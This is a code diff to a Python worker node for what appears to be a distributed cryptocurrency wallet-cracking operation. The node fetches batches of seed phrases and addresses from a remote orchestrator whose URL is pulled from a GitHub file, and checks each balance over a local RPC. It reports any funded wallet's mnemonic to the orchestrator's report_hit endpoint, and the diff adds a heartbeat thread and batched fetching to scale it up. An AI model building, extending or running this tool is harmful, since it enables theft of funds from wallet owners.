@@ -1,5 +1,6 @@
 import time
 import threading
+import uuid
 import urllib3
 import requests
 from concurrent.futures import ThreadPoolExecutor
@@ -7,7 +8,7 @@ from concurrent.futures import ThreadPoolExecutor
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 class DynamicConfig:
-    def __init__(self, github_url, interval=15):
+    def __init__(self, github_url, interval=30):
         self.github_url = github_url
         self.interval = interval
         self._url = self._initial_fetch()
@@ -52,9 +53,24 @@ class DynamicConfig:
             return self._url
 
 CONFIG = DynamicConfig("https://raw.githubusercontent.com/iceyfromdcrd/prlchecker/refs/heads/main/orchestrator.txt")
+
 RPC_URL = "https://localhost:44207"
 RPC_USER = "rpcuser"
 RPC_PASS = "rpcpass"
+MAX_WORKERS = 16  # Local workers on this machine
+CHECKER_ID = str(uuid.uuid4())
+
+def send_heartbeat():
+    """Background thread to register this checker node and its worker count to the orchestrator."""
+    while True:
+        try:
+            requests.post(f"{CONFIG.url}/heartbeat", json={
+                "checker_id": CHECKER_ID,
+                "workers": MAX_WORKERS
+            }, timeout=3)
+        except requests.exceptions.RequestException:
+            pass
+        time.sleep(15) # Heartbeat every 15 seconds
 
 def check_balance_via_rpc(address):
     payload = {
@@ -76,36 +92,44 @@ def check_balance_via_rpc(address):
         pass
     return 0.0
 
-def process_wallet():
-    try:
-        res = requests.get(f"{CONFIG.url}/get_wallet", timeout=2)
-        if res.status_code == 200:
-            data = res.json()
-            wallet = data.get("wallet")
-            if not wallet:
-                return
-            
-            mnemonic = wallet["mnemonic"]
-            address = wallet["address"]
-            
-            balance = check_balance_via_rpc(address)
-            if balance > 0:
-                requests.post(f"{CONFIG.url}/report_hit", json={
-                    "mnemonic": mnemonic,
-                    "address": address,
-                    "balance": balance
-                })
-        else:
-            time.sleep(0.5)
-    except requests.exceptions.RequestException:
-        time.sleep(1)
+def process_single_wallet(wallet):
+    mnemonic = wallet["mnemonic"]
+    address = wallet["address"]
+    
+    balance = check_balance_via_rpc(address)
+    if balance > 0:
+        try:
+            requests.post(f"{CONFIG.url}/report_hit", json={
+                "mnemonic": mnemonic,
+                "address": address,
+                "balance": balance
+            }, timeout=3)
+        except requests.exceptions.RequestException:
+            pass
 
 if __name__ == "__main__":
-    MAX_WORKERS = 16
-    print(f"Starting Checker Node with {MAX_WORKERS} workers...", flush=True)
+    print(f"Starting Checker Node (ID: {CHECKER_ID[:8]}...) with {MAX_WORKERS} workers...", flush=True)
+    
+    # Start background heartbeat daemon
+    hb_thread = threading.Thread(target=send_heartbeat, daemon=True)
+    hb_thread.start()
     
     with ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
         while True:
-            futures = [executor.submit(process_wallet) for _ in range(MAX_WORKERS)]
-            for f in futures:
-                f.result()
+            try:
+                # Fetch a batch matching worker capacity instead of hammering endpoint per wallet
+                res = requests.get(f"{CONFIG.url}/get_wallets?count={MAX_WORKERS}", timeout=3)
+                if res.status_code == 200:
+                    wallets = res.json().get("wallets", [])
+                    if not wallets:
+                        time.sleep(0.5)
+                        continue
+                    
+                    # Distribute batch across local thread pool workers cleanly
+                    futures = [executor.submit(process_single_wallet, w) for w in wallets]
+                    for future in futures:
+                        future.result()
+                else:
+                    time.sleep(0.5)
+            except requests.exceptions.RequestException:
+                time.sleep(1)
